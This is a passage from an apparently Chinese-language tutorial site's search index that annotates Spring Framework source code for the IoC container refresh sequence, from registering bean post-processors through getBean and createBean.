}\n        }\n        sortPostProcessors(currentRegistryProcessors, beanFactory);\n        registryProcessors.addAll(currentRegistryProcessors);\n        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n        currentRegistryProcessors.clear();\n\n        // Next, invoke the BeanDefinitionRegistryPostProcessors that implement Ordered.\n        postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n        for (String ppName : postProcessorNames) {\n            if (!processedBeans.contains(ppName) &amp;&amp; beanFactory.isTypeMatch(ppName, Ordered.class)) {\n                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n                processedBeans.add(ppName);\n            }\n        }\n        sortPostProcessors(currentRegistryProcessors, beanFactory);\n        registryProcessors.addAll(currentRegistryProcessors);\n        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n        currentRegistryProcessors.clear();\n\n        // Finally, invoke all other BeanDefinitionRegistryPostProcessors until no further ones appear.\n        boolean reiterate = true;\n        while (reiterate) {\n            reiterate = false;\n            postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n            for (String ppName : postProcessorNames) {\n                if (!processedBeans.contains(ppName)) {\n                    currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n                    processedBeans.add(ppName);\n                    reiterate = true;\n                }\n            }\n            sortPostProcessors(currentRegistryProcessors, beanFactory);\n            registryProcessors.addAll(currentRegistryProcessors);\n            invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n            currentRegistryProcessors.clear();\n        }\n\n        // Now, invoke the postProcessBeanFactory callback of all processors handled so far.\n        invokeBeanFactoryPostProcessors(registryProcessors, beanFactory);\n        invokeBeanFactoryPostProcessors(regularPostProcessors, beanFactory);\n    }\n\n    else {\n        // Invoke factory processors registered with the context instance.\n        invokeBeanFactoryPostProcessors(beanFactoryPostProcessors, beanFactory);\n    }\n\n    // Do not initialize FactoryBeans here: We need to leave all regular beans\n    // uninitialized to let the bean factory post-processors apply to them!\n    String[] postProcessorNames =\n            beanFactory.getBeanNamesForType(BeanFactoryPostProcessor.class, true, false);\n\n    // Separate between BeanFactoryPostProcessors that implement PriorityOrdered,\n    // Ordered, and the rest.\n    List&lt;BeanFactoryPostProcessor&gt; priorityOrderedPostProcessors = new ArrayList&lt;&gt;();\n    List&lt;String&gt; orderedPostProcessorNames = new ArrayList&lt;&gt;();\n    List&lt;String&gt; nonOrderedPostProcessorNames = new ArrayList&lt;&gt;();\n    for (String ppName : postProcessorNames) {\n        if (processedBeans.contains(ppName)) {\n            // skip - already processed in first phase above\n        }\n        else if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n            priorityOrderedPostProcessors.add(beanFactory.getBean(ppName, BeanFactoryPostProcessor.class));\n        }\n        else if (beanFactory.isTypeMatch(ppName, Ordered.class)) {\n            orderedPostProcessorNames.add(ppName);\n        }\n        else {\n            nonOrderedPostProcessorNames.add(ppName);\n        }\n    }\n\n    // First, invoke the BeanFactoryPostProcessors that implement PriorityOrdered.\n    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);\n    invokeBeanFactoryPostProcessors(priorityOrderedPostProcessors, beanFactory);\n\n    // Next, invoke the BeanFactoryPostProcessors that implement Ordered.\n    List&lt;BeanFactoryPostProcessor&gt; orderedPostProcessors = new ArrayList&lt;&gt;(orderedPostProcessorNames.size());\n    for (String postProcessorName : orderedPostProcessorNames) {\n        orderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));\n    }\n    sortPostProcessors(orderedPostProcessors, beanFactory);\n    invokeBeanFactoryPostProcessors(orderedPostProcessors, beanFactory);\n\n    // Finally, invoke all other BeanFactoryPostProcessors.\n    List&lt;BeanFactoryPostProcessor&gt; nonOrderedPostProcessors = new ArrayList&lt;&gt;(nonOrderedPostProcessorNames.size());\n    for (String postProcessorName : nonOrderedPostProcessorNames) {\n        nonOrderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));\n    }\n    invokeBeanFactoryPostProcessors(nonOrderedPostProcessors, beanFactory);\n\n    // Clear cached merged bean definitions since the post-processors might have\n    // modified the original metadata, e.g. replacing placeholders in values...\n    beanFactory.clearMetadataCache();\n}\n\n// \u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5185\u90e8\u200b\u6709\u200b\u8c03\u7528\u200b\u8be5\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200b\nprivate static void invokeBeanDefinitionRegistryPostProcessors(\n        Collection&lt;? extends BeanDefinitionRegistryPostProcessor&gt; postProcessors, BeanDefinitionRegistry registry) {\n\n    for (BeanDefinitionRegistryPostProcessor postProcessor : postProcessors) {\n        postProcessor.postProcessBeanDefinitionRegistry(registry);\n    }\n}\n\n// \u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5185\u90e8\u200b\u6709\u200b\u8c03\u7528\u200b\u8be5\u200b\u65b9\u6cd5\u200b\nprivate static void sortPostProcessors(List&lt;?&gt; postProcessors, ConfigurableListableBeanFactory beanFactory) {\n    Comparator&lt;Object&gt; comparatorToUse = null;\n    if (beanFactory instanceof DefaultListableBeanFactory) {\n        comparatorToUse = ((DefaultListableBeanFactory) beanFactory).getDependencyComparator();\n    }\n    if (comparatorToUse == null) {\n        comparatorToUse = OrderComparator.INSTANCE;\n    }\n    postProcessors.sort(comparatorToUse);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#9-registerbeanpostprocessorsbeanfactory","title":"9. registerBeanPostProcessors(beanFactory);\u200b\u65b9\u6cd5","text":"<p>Java<pre><code>protected void registerBeanPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n    PostProcessorRegistrationDelegate.registerBeanPostProcessors(beanFactory, this);\n}\n</code></pre> - PostProcessorRegistrationDelegate\u200b\u7684\u200bregisterBeanPostProcessors(ConfigurableListableBeanFactory beanFactory, AbstractApplicationContext applicationContexs)\u200b\u9759\u6001\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>public static void registerBeanPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, AbstractApplicationContext applicationContext) {\n\n    String[] postProcessorNames = beanFactory.getBeanNamesForType(BeanPostProcessor.class, true, false);\n\n    // Register BeanPostProcessorChecker that logs an info message when\n    // a bean is created during BeanPostProcessor instantiation, i.e. when\n    // a bean is not eligible for getting processed by all BeanPostProcessors.\n    int beanProcessorTargetCount = beanFactory.getBeanPostProcessorCount() + 1 + postProcessorNames.length;\n    beanFactory.addBeanPostProcessor(new BeanPostProcessorChecker(beanFactory, beanProcessorTargetCount));\n\n    // Separate between BeanPostProcessors that implement PriorityOrdered,\n    // Ordered, and the rest.\n    List&lt;BeanPostProcessor&gt; priorityOrderedPostProcessors = new ArrayList&lt;&gt;();\n    List&lt;BeanPostProcessor&gt; internalPostProcessors = new ArrayList&lt;&gt;();\n    List&lt;String&gt; orderedPostProcessorNames = new ArrayList&lt;&gt;();\n    List&lt;String&gt; nonOrderedPostProcessorNames = new ArrayList&lt;&gt;();\n    for (String ppName : postProcessorNames) {\n        if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n            BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n            priorityOrderedPostProcessors.add(pp);\n            if (pp instanceof MergedBeanDefinitionPostProcessor) {\n                internalPostProcessors.add(pp);\n            }\n        }\n        else if (beanFactory.isTypeMatch(ppName, Ordered.class)) {\n            orderedPostProcessorNames.add(ppName);\n        }\n        else {\n            nonOrderedPostProcessorNames.add(ppName);\n        }\n    }\n\n    // First, register the BeanPostProcessors that implement PriorityOrdered.\n    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);\n    registerBeanPostProcessors(beanFactory, priorityOrderedPostProcessors);\n\n    // Next, register the BeanPostProcessors that implement Ordered.\n    List&lt;BeanPostProcessor&gt; orderedPostProcessors = new ArrayList&lt;&gt;(orderedPostProcessorNames.size());\n    for (String ppName : orderedPostProcessorNames) {\n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n        orderedPostProcessors.add(pp);\n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n            internalPostProcessors.add(pp);\n        }\n    }\n    sortPostProcessors(orderedPostProcessors, beanFactory);\n    registerBeanPostProcessors(beanFactory, orderedPostProcessors);\n\n    // Now, register all regular BeanPostProcessors.\n    List&lt;BeanPostProcessor&gt; nonOrderedPostProcessors = new ArrayList&lt;&gt;(nonOrderedPostProcessorNames.size());\n    for (String ppName : nonOrderedPostProcessorNames) {\n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n        nonOrderedPostProcessors.add(pp);\n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n            internalPostProcessors.add(pp);\n        }\n    }\n    registerBeanPostProcessors(beanFactory, nonOrderedPostProcessors);\n\n    // Finally, re-register all internal BeanPostProcessors.\n    sortPostProcessors(internalPostProcessors, beanFactory);\n    registerBeanPostProcessors(beanFactory, internalPostProcessors);\n\n    // Re-register post-processor for detecting inner beans as ApplicationListeners,\n    // moving it to the end of the processor chain (for picking up proxies etc).\n    beanFactory.addBeanPostProcessor(new ApplicationListenerDetector(applicationContext));\n}\n\n\n//\u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5185\u90e8\u200b\u6709\u200b\u8c03\u7528\u200b\u8be5\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200b\nprivate static void registerBeanPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, List&lt;BeanPostProcessor&gt; postProcessors) {\n\n    for (BeanPostProcessor postProcessor : postProcessors) {\n        beanFactory.addBeanPostProcessor(postProcessor);\n    }\n}\n</code></pre></p>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#10-initmessagesource","title":"10. initMessageSource();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200binitMessageSource()\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void initMessageSource() {\n    ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    if (beanFactory.containsLocalBean(MESSAGE_SOURCE_BEAN_NAME)) {\n        this.messageSource = beanFactory.getBean(MESSAGE_SOURCE_BEAN_NAME, MessageSource.class);\n        // Make MessageSource aware of parent MessageSource.\n        if (this.parent != null &amp;&amp; this.messageSource instanceof HierarchicalMessageSource) {\n            HierarchicalMessageSource hms = (HierarchicalMessageSource) this.messageSource;\n            if (hms.getParentMessageSource() == null) {\n                // Only set parent context as parent MessageSource if no parent MessageSource\n                // registered already.\n                hms.setParentMessageSource(getInternalParentMessageSource());\n            }\n        }\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Using MessageSource [\" + this.messageSource + \"]\");\n        }\n    }\n    else {\n        // Use empty MessageSource to be able to accept getMessage calls.\n        DelegatingMessageSource dms = new DelegatingMessageSource();\n        dms.setParentMessageSource(getInternalParentMessageSource());\n        this.messageSource = dms;\n        beanFactory.registerSingleton(MESSAGE_SOURCE_BEAN_NAME, this.messageSource);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"No '\" + MESSAGE_SOURCE_BEAN_NAME + \"' bean, using [\" + this.messageSource + \"]\");\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#11-initapplicationeventmulticaster","title":"11. initApplicationEventMulticaster();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200binitApplicationEventMulticaster()\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void initApplicationEventMulticaster() {\n    ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    if (beanFactory.containsLocalBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME)) {\n        this.applicationEventMulticaster =\n                beanFactory.getBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, ApplicationEventMulticaster.class);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Using ApplicationEventMulticaster [\" + this.applicationEventMulticaster + \"]\");\n        }\n    }\n    else {\n        this.applicationEventMulticaster = new SimpleApplicationEventMulticaster(beanFactory);\n        beanFactory.registerSingleton(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, this.applicationEventMulticaster);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"No '\" + APPLICATION_EVENT_MULTICASTER_BEAN_NAME + \"' bean, using \" +\n                    \"[\" + this.applicationEventMulticaster.getClass().getSimpleName() + \"]\");\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#12-onrefresh","title":"12. onRefresh();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bonRefresh()\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void onRefresh() throws BeansException {\n    // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4f9d\u636e\u200b\u5177\u4f53\u200b\u7684\u200b\u60c5\u51b5\u200b\u5728\u200b\u5176\u5b50\u200b\u7c7b\u4e2d\u200b\u7ee7\u627f\u200b\u6216\u200b\u8fdb\u884c\u200b\u91cd\u5199\u200b\n    // For subclasses: do nothing by default.\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#13-registerlisteners","title":"13. registerListeners();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bregisterListeners()\u200b\u65b9\u6cd5\u200b Java<pre><code>    protected void registerListeners() {\n        // Register statically specified listeners first.\n        for (ApplicationListener&lt;?&gt; listener : getApplicationListeners()) {\n            getApplicationEventMulticaster().addApplicationListener(listener);\n        }\n\n        // Do not initialize FactoryBeans here: We need to leave all regular beans\n        // uninitialized to let post-processors apply to them!\n        String[] listenerBeanNames = getBeanNamesForType(ApplicationListener.class, true, false);\n        for (String listenerBeanName : listenerBeanNames) {\n            getApplicationEventMulticaster().addApplicationListenerBean(listenerBeanName);\n        }\n\n        // Publish early application events now that we finally have a multicaster...\n        Set&lt;ApplicationEvent&gt; earlyEventsToProcess = this.earlyApplicationEvents;\n        this.earlyApplicationEvents = null;\n        if (earlyEventsToProcess != null) {\n            for (ApplicationEvent earlyEvent : earlyEventsToProcess) {\n                getApplicationEventMulticaster().multicastEvent(earlyEvent);\n            }\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#14-finishbeanfactoryinitializationbeanfactory","title":"14. finishBeanFactoryInitialization(beanFactory);\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bfinishBeanFactoryInitialization(beanFactory)\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u5b9e\u4f8b\u200b\u5316\u200bBean\u200b\u7684\u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void finishBeanFactoryInitialization(ConfigurableListableBeanFactory beanFactory) {\n    // Initialize conversion service for this context.\n    if (beanFactory.containsBean(CONVERSION_SERVICE_BEAN_NAME) &amp;&amp;\n            beanFactory.isTypeMatch(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class)) {\n        beanFactory.setConversionService(\n                beanFactory.getBean(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class));\n    }\n\n    // Register a default embedded value resolver if no bean post-processor\n    // (such as a PropertyPlaceholderConfigurer bean) registered any before:\n    // at this point, primarily for resolution in annotation attribute values.\n    if (!beanFactory.hasEmbeddedValueResolver()) {\n        beanFactory.addEmbeddedValueResolver(strVal -&gt; getEnvironment().resolvePlaceholders(strVal));\n    }\n\n    // Initialize LoadTimeWeaverAware beans early to allow for registering their transformers early.\n    String[] weaverAwareNames = beanFactory.getBeanNamesForType(LoadTimeWeaverAware.class, false, false);\n    for (String weaverAwareName : weaverAwareNames) {\n        getBean(weaverAwareName);\n    }\n\n    // Stop using the temporary ClassLoader for type matching.\n    beanFactory.setTempClassLoader(null);\n\n    // Allow for caching all bean definition metadata, not expecting further changes.\n    beanFactory.freezeConfiguration();\n\n    // Instantiate all remaining (non-lazy-init) singletons.\n    // \u200b\u5b9e\u4f8b\u200b\u5316\u200bbean\u200b\u7684\u200b\u6838\u5fc3\u200b\u4ee3\u7801\u200b\n    beanFactory.preInstantiateSingletons(); \n    // \u200b\u4e0a\u200b\u4e00\u884c\u200b\u7684\u200bpreInstantiateSingletons()\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bConfigurableListableBeanFactory\u200b\u63a5\u53e3\u200b\u4e2d\u200b\uff0c\n    // \u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u662f\u200b\u5728\u200bDefaultListableBeanFactory\u200b\u4e2d\u200bpreInstantiateSingletons()\u200b\u65b9\u6cd5\u200b\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#defaultlistablebeanfactorypreinstantiatesingletons","title":"DefaultListableBeanFactory\u200b\u4e2d\u200bpreInstantiateSingletons()\u200b\u65b9\u6cd5","text":"Java<pre><code>@Override\npublic void preInstantiateSingletons() throws BeansException {\n    if (logger.isTraceEnabled()) {\n        logger.trace(\"Pre-instantiating singletons in \" + this);\n    }\n\n    // Iterate over a copy to allow for init methods which in turn register new bean definitions.\n    // While this may not be part of the regular factory bootstrap, it does otherwise work fine.\n    List&lt;String&gt; beanNames = new ArrayList&lt;&gt;(this.beanDefinitionNames);\n\n    // Trigger initialization of all non-lazy singleton beans...\n    // \u200b\u904d\u5386\u200bbeanDefinitionNames\u200b\u8fd9\u4e2a\u200bArrayList\u200b\u5bf9\u8c61\u200b\u4e2d\u200b\u7684\u200bbeanName\uff0c\n    for (String beanName : beanNames) {\n        RootBeanDefinition bd = getMergedLocalBeanDefinition(beanName);\n        if (!bd.isAbstract() &amp;&amp; bd.isSingleton() &amp;&amp; !bd.isLazyInit()) {\n            if (isFactoryBean(beanName)) {\n                Object bean = getBean(FACTORY_BEAN_PREFIX + beanName);\n                if (bean instanceof FactoryBean) {\n                    final FactoryBean&lt;?&gt; factory = (FactoryBean&lt;?&gt;) bean;\n                    boolean isEagerInit;\n                    if (System.getSecurityManager() != null &amp;&amp; factory instanceof SmartFactoryBean) {\n                        isEagerInit = AccessController.doPrivileged((PrivilegedAction&lt;Boolean&gt;)\n                                        ((SmartFactoryBean&lt;?&gt;) factory)::isEagerInit,\n                                getAccessControlContext());\n                    }\n                    else {\n                        isEagerInit = (factory instanceof SmartFactoryBean &amp;&amp;\n                                ((SmartFactoryBean&lt;?&gt;) factory).isEagerInit());\n                    }\n                    if (isEagerInit) {\n                        // \u200b\u521b\u5efa\u200bbean\u200b\u5e76\u200b\u9012\u5f52\u200b\u6784\u5efa\u200bBean\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n                        getBean(beanName);\n                    }\n                }\n            }\n            else {\n                // \u200b\u521b\u5efa\u200bbean\u200b\u5e76\u200b\u9012\u5f52\u200b\u6784\u5efa\u200bBean\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n                getBean(beanName);\n            }\n        }\n    }\n\n    // Trigger post-initialization callback for all applicable beans...\n    for (String beanName : beanNames) {\n        Object singletonInstance = getSingleton(beanName);\n        if (singletonInstance instanceof SmartInitializingSingleton) {\n            final SmartInitializingSingleton smartSingleton = (SmartInitializingSingleton) singletonInstance;\n            if (System.getSecurityManager() != null) {\n                AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt; {\n                    smartSingleton.afterSingletonsInstantiated();\n                    return null;\n                }, getAccessControlContext());\n            }\n            else {\n                smartSingleton.afterSingletonsInstantiated();\n            }\n        }\n    }\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#preinstantiatesingletonsgetbean","title":"preInstantiateSingletons()\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bgetBean\u200b\u65b9\u6cd5","text":"<ul> <li>getBean\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bBeanFactory\u200b\u63a5\u53e3\u200b\u4e2d\u200b</li> <li>getBean\u200b\u65b9\u6cd5\u200borg.springframework.beans.factory.support.AbstractBeanFactory\u200b\u4e2d\u200b\u5b9e\u73b0\u200b Java<pre><code>@Override\npublic Object getBean(String name) throws BeansException {\n    return doGetBean(name, null, null, false);\n}\n\n\n\n//\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e0a\u9762\u200b\u65b9\u6cd5\u200b\u8c03\u7528\u200bdoGetBean(name, null, null, false)\u200b\u65b9\u6cd5\u200b\n// \u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u7279\u522b\u200b\u957f\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u5b8c\u6574\u200b\u4ee3\u7801\u200b\uff1a\n@SuppressWarnings(\"unchecked\")\nprotected &lt;T&gt; T doGetBean(final String name, @Nullable final Class&lt;T&gt; requiredType,\n        @Nullable final Object[] args, boolean typeCheckOnly) throws BeansException {\n\n    final String beanName = transformedBeanName(name);\n    Object bean;\n\n    // Eagerly check singleton cache for manually registered singletons.\n    Object sharedInstance = getSingleton(beanName);\n    if (sharedInstance != null &amp;&amp; args == null) {\n        if (logger.isTraceEnabled()) {\n            if (isSingletonCurrentlyInCreation(beanName)) {\n                logger.trace(\"Returning eagerly cached instance of singleton bean '\" + beanName +\n                        \"' that is not fully initialized yet - a consequence of a circular reference\");\n            }\n            else {\n                logger.trace(\"Returning cached instance of singleton bean '\" + beanName + \"'\");\n            }\n        }\n        bean = getObjectForBeanInstance(sharedInstance, name, beanName, null);\n    }\n\n    else {\n        // Fail if we're already creating this bean instance:\n        // We're assumably within a circular reference.\n        if (isPrototypeCurrentlyInCreation(beanName)) {\n            throw new BeanCurrentlyInCreationException(beanName);\n        }\n\n        // Check if bean definition exists in this factory.\n        BeanFactory parentBeanFactory = getParentBeanFactory();\n        if (parentBeanFactory != null &amp;&amp; !containsBeanDefinition(beanName)) {\n            // Not found -&gt; check parent.\n            String nameToLookup = originalBeanName(name);\n            if (parentBeanFactory instanceof AbstractBeanFactory) {\n                return ((AbstractBeanFactory) parentBeanFactory).doGetBean(\n                        nameToLookup, requiredType, args, typeCheckOnly);\n            }\n            else if (args != null) {\n                // Delegation to parent with explicit args.\n                return (T) parentBeanFactory.getBean(nameToLookup, args);\n            }\n            else if (requiredType != null) {\n                // No args -&gt; delegate to standard getBean method.\n                return parentBeanFactory.getBean(nameToLookup, requiredType);\n            }\n            else {\n                return (T) parentBeanFactory.getBean(nameToLookup);\n            }\n        }\n\n        if (!typeCheckOnly) {\n            markBeanAsCreated(beanName);\n        }\n\n        try {\n            final RootBeanDefinition mbd = getMergedLocalBeanDefinition(beanName);\n            checkMergedBeanDefinition(mbd, beanName, args);\n\n            // Guarantee initialization of beans that the current bean depends on.\n            // \u200b\u83b7\u53d6\u200b\u5f53\u524d\u200bbean\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n            String[] dependsOn = mbd.getDependsOn();\n            // \u200b\u6839\u636e\u200b\u4f9d\u8d56\u200b\u7684\u200bbeanName\u200b\u9012\u5f52\u200b\u8c03\u7528\u200bgetBean()\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u4e0d\u65ad\u200b\u63a2\u5bfb\u200b\u5176\u200b\u4f9d\u8d56\u200b\u7684\u200bbean\uff0c\u200b\u76f4\u5230\u200bgetSingleton\u200b\u65b9\u6cd5\u200b\u8fd4\u56de\u200b\u4f9d\u8d56\u200b\u7684\u200bBean\uff0c\u200b\u5373\u200b\u5f53\u524d\u200b\u6b63\u5728\u200b\u521b\u5efa\u200b\u7684\u200bBean\n            // \u200b\u76f4\u5230\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\u6700\u5e95\u5c42\u200b\u7684\u200bbean\u200b\u6ca1\u6709\u200b\u4f9d\u8d56\u200b\u5bf9\u8c61\u200b\u4e86\u200b\uff0c\u200b\u81f3\u6b64\u200b\u6574\u4e2a\u200b\u9012\u5f52\u200b\u8fc7\u7a0b\u200b\u7ed3\u675f\u200b  \n            if (dependsOn != null) {\n                for (String dep : dependsOn) {\n                    if (isDependent(beanName, dep)) {\n                        throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                                \"Circular depends-on relationship between '\" + beanName + \"' and '\" + dep + \"'\");\n                    }\n                    // \n                    registerDependentBean(dep, beanName);\n                    try {\n                        getBean(dep);\n                    }\n                    catch (NoSuchBeanDefinitionException ex) {\n                        throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                                \"'\" + beanName + \"' depends on missing bean '\" + dep + \"'\", ex);\n                    }\n                }\n            }\n            // Create bean instance.\n            if (mbd.isSingleton()) {\n                // getSingleton\u200b\u65b9\u6cd5\u200b\u7684\u200b\u53c2\u6570\u200b\u662f\u200bcreateBean(beanName, mbd, args)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u8fd4\u56de\u503c\u200b\n                sharedInstance = getSingleton(beanName, () -&gt; {\n                    try {\n                        // createBean\u200b\u65b9\u6cd5\u200b\u5728\u200bAbstractBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u662f\u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\n                        return createBean(beanName, mbd, args);\n                    }\n                    catch (BeansException ex) {\n                        // Explicitly remove instance from singleton cache: It might have been put there\n                        // eagerly by the creation process, to allow for circular reference resolution.\n                        // Also remove any beans that received a temporary reference to the bean.\n                        destroySingleton(beanName);\n                        throw ex;\n                    }\n                });\n                bean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);\n            }\n\n            else if (mbd.isPrototype()) {\n                // It's a prototype -&gt; create a new instance.\n                Object prototypeInstance = null;\n                try {\n                    beforePrototypeCreation(beanName);\n                    prototypeInstance = createBean(beanName, mbd, args);\n                }\n                finally {\n                    afterPrototypeCreation(beanName);\n                }\n                bean = getObjectForBeanInstance(prototypeInstance, name, beanName, mbd);\n            }\n\n            else {\n                String scopeName = mbd.getScope();\n                final Scope scope = this.scopes.get(scopeName);\n                if (scope == null) {\n                    throw new IllegalStateException(\"No Scope registered for scope name '\" + scopeName + \"'\");\n                }\n                try {\n                    Object scopedInstance = scope.get(beanName, () -&gt; {\n                        beforePrototypeCreation(beanName);\n                        try {\n                            return createBean(beanName, mbd, args);\n                        }\n                        finally {\n                            afterPrototypeCreation(beanName);\n                        }\n                    });\n                    bean = getObjectForBeanInstance(scopedInstance, name, beanName, mbd);\n                }\n                catch (IllegalStateException ex) {\n                    throw new BeanCreationException(beanName,\n                            \"Scope '\" + scopeName + \"' is not active for the current thread; consider \" +\n                            \"defining a scoped proxy for this bean if you intend to refer to it from a singleton\",\n                            ex);\n                }\n            }\n        }\n        catch (BeansException ex) {\n            cleanupAfterBeanCreationFailure(beanName);\n            throw ex;\n        }\n    }\n\n    // Check if required type matches the type of the actual bean instance.\n    if (requiredType != null &amp;&amp; !requiredType.isInstance(bean)) {\n        try {\n            T convertedBean = getTypeConverter().convertIfNecessary(bean, requiredType);\n            if (convertedBean == null) {\n                throw new BeanNotOfRequiredTypeException(name, requiredType, bean.getClass());\n            }\n            return convertedBean;\n        }\n        catch (TypeMismatchException ex) {\n            if (logger.isTraceEnabled()) {\n                logger.trace(\"Failed to convert bean '\" + name + \"' to required type '\" +\n                        ClassUtils.getQualifiedName(requiredType) + \"'\", ex);\n            }\n            throw new BeanNotOfRequiredTypeException(name, requiredType, bean.getClass());\n        }\n    }\n    return (T) bean;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractautowirecapablebeanfactorycreatebeanstring-beanname-rootbeandefinition-mbd-nullable-object-args","title":"AbstractAutowireCapableBeanFactory\u200b\u7c7b\u4e2d\u200b\u7684\u200bcreateBean(String beanName, RootBeanDefinition mbd, @Nullable Object[] args)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory Java<pre><code>@Override\nprotected Object createBean(String beanName, RootBeanDefinition mbd, @Nullable Object[] args)\n        throws BeanCreationException {\n\n    if (logger.isTraceEnabled()) {\n        logger.trace(\"Creating instance of bean '\" + beanName + \"'\");\n    }\n    RootBeanDefinition mbdToUse = mbd;\n\n    // Make sure bean class is actually resolved at this point, and\n    // clone the bean definition in case of a dynamically resolved Class\n    // which cannot be stored in the shared merged bean definition.\n    Class&lt;?&gt; resolvedClass = resolveBeanClass(mbd, beanName);\n    if (resolvedClass != null &amp;&amp; !mbd.hasBeanClass() &amp;&amp; 